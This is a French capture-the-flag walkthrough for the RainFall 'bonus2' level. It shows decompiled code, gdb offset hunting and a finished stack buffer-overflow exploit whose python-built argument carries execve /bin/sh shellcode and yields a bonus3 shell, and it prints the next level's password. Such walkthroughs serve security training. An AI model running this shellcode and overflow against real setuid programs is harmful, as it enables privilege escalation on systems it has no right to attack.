# Bonus 2

```
bonus2@RainFall:~$ ./bonus2 coucou salut
Hello coucou
```

Le programme prend deux arguments

```
undefined4 main(int param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  byte bVar5;
  undefined4 local_60 [10];
  char acStack_38 [36];
  char *local_14;

  bVar5 = 0;
  if (param_1 == 3) {
    puVar3 = local_60;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    strncpy((char *)local_60,*(char **)(param_2 + 4),0x28);
    strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
    local_14 = getenv("LANG");
    if (local_14 != (char *)0x0) {
      iVar2 = memcmp(local_14,&DAT_0804873d,2);
      if (iVar2 == 0) {
        language = 1;
      }
      else {
        iVar2 = memcmp(local_14,&DAT_08048740,2);
        if (iVar2 == 0) {
          language = 2;
        }
      }
    }
    puVar3 = local_60;
    puVar4 = (undefined4 *)&stack0xffffff50;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *puVar3;
      puVar3 = puVar3 + (uint)bVar5 * -2 + 1;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
    uVar1 = greetuser();
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

Apres décompilation nous constatons que le programme utilise une variable d'environnement.

Néanmoins ce ne sera pas utilisé pour l'exploit, qui consiste dans un premier temps a envoyer mon pattern

```
(gdb) run AAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUUVVVVWWWWXXXXYYYYZZZZ aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Starting program: /home/user/bonus2/bonus2 AAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUUVVVVWWWWXXXXYYYYZZZZ aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Hello AAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKaaaabbbbccccddddeeeeffffgggghhhh

Program received signal SIGSEGV, Segmentation fault.
0x08006868 in ?? ()
```

On constate que le programme cherche a jump à "gg"
Diminuons le pattern a "gg"
```
(gdb) run (gdb) run AAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUUVVVVWWWWXXXXYYYYZZZZ aaaabbbbccccddddeeeeffffgg
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 AAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUUVVVVWWWWXXXXYYYYZZZZ aaaabbbbccccddddeeeeffffgg

Breakpoint 1, 0x080485db in main ()
(gdb) c
Continuing.
Hello AAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKaaaabbbbccccddddeeeeffffgg

Program received signal SIGSEGV, Segmentation fault.
0x43424242 in ?? ()
(gdb) x/100x $esp
0xbffff608:	0x44434343	0x45444444	0x46454545	0x47464646
0xbffff618:	0x48474747	0x49484848	0x4a494949	0x4b4a4a4a
0xbffff628:	0x61616161	0x62626262	0x63636363	0x64646464
0xbffff638:	0x65656565	0x66666666	0x00006767	0x00000000
0xbffff648:	0x00000000	0xb7e5ec73	0x41414141	0x43424242 <== le programme veux maintenant jump ici
0xbffff658:	0x44434343	0x45444444	0x46454545	0x47464646
```

Nous allons mettre une adresse vers notre shellcode, le tout dans le 1er argument.

```
Starting program: /home/user/bonus2/bonus2 AAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUUVVVVWWWWXXXXYYYYZZZZ aaaabbbbccccddddeeeeffffgg

Breakpoint 1, 0x080485db in main ()
(gdb) c
Continuing.
Hello AAAABBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKaaaabbbbccccddddeeeeffffgg

Program received signal SIGSEGV, Segmentation fault.
0x43424242 in ?? ()
(gdb) x/200x $esp
0xbffff608:	0x44434343	0x45444444	0x46454545	0x47464646
0xbffff618:	0x48474747	0x49484848	0x4a494949	0x4b4a4a4a
0xbffff628:	0x61616161	0x62626262	0x63636363	0x64646464
0xbffff638:	0x65656565	0x66666666	0x00006767	0x00000000
0xbffff648:	0x00000000	0xb7e5ec73	0x41414141	0x43424242 <== le programme utilise cette adresse pour EIP
0xbffff658:	0x44434343	0x45444444	0x46454545	0x47464646
0xbffff668:	0x48474747	0x49484848	0x4a494949	0x4b4a4a4a
0xbffff678:	0x61616161	0x62626262	0x63636363	0x64646464
0xbffff688:	0x65656565	0x66666666	0x00006767	0x00000000
0xbffff698:	0x00000000	0xbfffff31	0xb7fed280	0x00000000
0xbffff6a8:	0x08048649	0xb7fd0ff4	0x00000000	0x00000000
0xbffff6b8:	0x00000000	0xb7e454d3	0x00000003	0xbffff754
...
0xbffff848:	0xbffff86b	0x00000000	0x00000000	0x00000000
0xbffff858:	0x13000000	0x10d84250	0xa5ce9509	0x5ba63a24
0xbffff868:	0x69c7d951	0x00363836	0x00000000	0x00000000
0xbffff878:	0x6d6f682f	0x73752f65	0x622f7265	0x73756e6f
0xbffff888:	0x6f622f32	0x3273756e	0x41414100	0x42424241
0xbffff898:	0x43434343	0x44444444	0x45454545	0x46464646 <== nous allons utiliser cette adresse pour la redirection vers notre shellcode
0xbffff8a8:	0x47474747	0x48484848	0x49494949	0x4a4a4a4a
```

```
(gdb) run $(python -c 'print("AAAA" + "\xa8\xf8\xff\xbf" + "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A" * 46)') aaaabbbbccccddddeeeeffffgg
Starting program: /home/user/bonus2/bonus2 $(python -c 'print("AAAA" + "\xa8\xf8\xff\xbf" + "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A" * 46)') aaaabbbbccccddddeeeeffffgg
Hello AAAA??????????????????????????????????1?aaaabbbbccccddddeeeeffffgg
process 7589 is executing new program: /bin/dash
$
[Inferior 1 (process 7589) exited normally]
```

Plus qu'à essayer hors de gdb.

```
bonus2@RainFall:~$ /home/user/bonus2/bonus2 $(python -c 'print("AAAA" + "\xa8\xf8\xff\xbf" + "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A" * 46)') aaaabbbbccccddddeeeeffffgg
Hello AAAA??????????????????????????????????1?aaaabbbbccccddddeeeeffffgg
Segmentation fault (core dumped)
```

segfault, l'alignement de la pile ne doit pas être identique.

```
bonus2@RainFall:~$ dmesg | grep segfault
[168385.589288] bonus2[7607]: segfault at 90909090 ip 90909090 sp bffff608 error 14
```

Après plusieurs essais dans les offsets nous arrivons à ce shellcode :

```
bonus2@RainFall:~$ /home/user/bonus2/bonus2 $(python -c 'print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\xa8\xf8\xff\xbf" + "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A" * 30)') aaaabbbbccccddddeeeeffffgg
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????aaaabbbbccccddddeeeeffffgg
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
